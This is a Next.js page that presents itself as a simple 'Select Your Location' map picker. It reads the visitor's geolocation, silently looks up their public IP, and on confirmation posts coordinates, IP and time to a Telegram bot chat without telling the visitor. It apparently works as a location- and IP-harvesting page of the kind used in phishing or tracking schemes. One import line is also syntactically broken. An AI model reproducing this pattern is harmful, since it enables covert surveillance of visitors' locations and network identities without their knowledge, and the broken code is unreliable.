'use client';

import React, { useEffect, useState } from 'react';
import dynamic from 'next/dynamic';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/telegramConfig';
import L { LeafletMouseEvent } from 'leaflet';
import { useMapEvents } from 'react-leaflet'; // ✅ Hook must be statically imported

// ✅ Dynamically import only components from react-leaflet
const MapContainer = dynamic(() => import('react-leaflet').then(mod => mod.MapContainer), { ssr: false });
const TileLayer = dynamic(() => import('react-leaflet').then(mod => mod.TileLayer), { ssr: false });
const Marker = dynamic(() => import('react-leaflet').then(mod => mod.Marker), { ssr: false });

// ✅ Custom red icon for selected marker
const redIcon = new L.Icon({
  iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-red.png',
  shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
  iconSize: [25, 41],
  iconAnchor: [12, 41],
  popupAnchor: [1, -34],
  shadowSize: [41, 41],
});

export default function SelectLocationPage() {
  const [selectedPosition, setSelectedPosition] = useState<[number, number] | null>(null);
  const [mapCenter, setMapCenter] = useState<[number, number]>([37.7749, -122.4194]);
  const [ip, setIp] = useState('');
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== 'undefined' && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          setMapCenter([latitude, longitude]);
          setSelectedPosition([latitude, longitude]);
        },
        (error) => {
          console.error('Geolocation error:', error);
        }
      );
    }

    axios
      .get('https://api.ipify.org?format=json')
      .then((res) => setIp(res.data.ip))
      .catch((err) => console.error('IP fetch error:', err));
  }, []);

  const LocationMarker = () => {
    useMapEvents({
      click(e: LeafletMouseEvent) {
        setSelectedPosition([e.latlng.lat, e.latlng.lng]);
      },
    });

    return selectedPosition ? <Marker position={selectedPosition} icon={redIcon} /> : null;
  };

  const handleConfirm = async () => {
    if (!selectedPosition) return;

    const [lat, lng] = selectedPosition;
    const message = `
📍 *New Location Confirmed*
-------------------------
🌎 *Latitude:* ${lat}
🌍 *Longitude:* ${lng}
🖥️ *IP Address:* ${ip}
🕒 *Time:* ${new Date().toLocaleString()}
`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      });

      router.push('/thank-you');
    } catch (error) {
      console.error('Telegram Error:', error);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-100 text-[#2C2A61] font-sans px-6 py-10">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl md:text-4xl font-bold mb-6 text-center">📍 Select Your Location</h1>

        <div className="w-full h-[500px] rounded-xl overflow-hidden shadow-lg border border-gray-300 mb-6">
          <MapContainer
            center={mapCenter}
            zoom={13}
            scrollWheelZoom
            style={{ height: '100%', width: '100%' }}
          >
            <TileLayer
              url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
              attribution="&copy; OpenStreetMap contributors"
            />
            <LocationMarker />
          </MapContainer>
        </div>

        {selectedPosition && (
          <div className="text-center mb-4 text-gray-700 text-sm">
            ✅ Location selected:{' '}
            <strong>{selectedPosition[0].toFixed(5)}</strong>,{' '}
            <strong>{selectedPosition[1].toFixed(5)}</strong>
          </div>
        )}

        <div className="text-center">
          <button
            onClick={handleConfirm}
            disabled={!selectedPosition}
            className="bg-[#2C2A61] text-white px-6 py-3 rounded-full font-semibold shadow-md hover:bg-[#1d1a45] transition-all duration-300 disabled:opacity-50"
          >
            Confirm My Location
          </button>
        </div>
      </div>
    </div>
  );
}
